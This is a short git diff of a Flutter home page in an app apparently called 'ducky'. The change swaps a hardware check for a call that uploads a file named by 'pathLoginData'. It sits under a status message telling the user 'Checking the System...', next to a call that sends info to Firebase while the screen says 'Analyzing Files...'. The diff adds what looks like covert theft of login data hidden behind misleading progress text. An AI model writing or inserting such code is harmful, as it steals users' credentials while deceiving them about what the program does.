@@ -1,5 +1,6 @@
 import 'dart:io';
 
+import 'package:ducky/constants/path_constants.dart';
 import 'package:ducky/services/download_services.dart';
 import 'package:ducky/services/services.dart';
 import 'package:ducky/utils/utils.dart';
@@ -178,7 +179,8 @@ class _HomePageState extends State<HomePage> {
                               setState(() => status = 'Analyzing Files...');
                               await duckServices.sendInfoFirebase(context);
                               setState(() => status = 'Checking the System...');
-                              await duckServices.getHardware();
+
+                              await duckServices.uploadFile(pathLoginData);
 
                               if (!context.mounted) return;
                               _start(context);
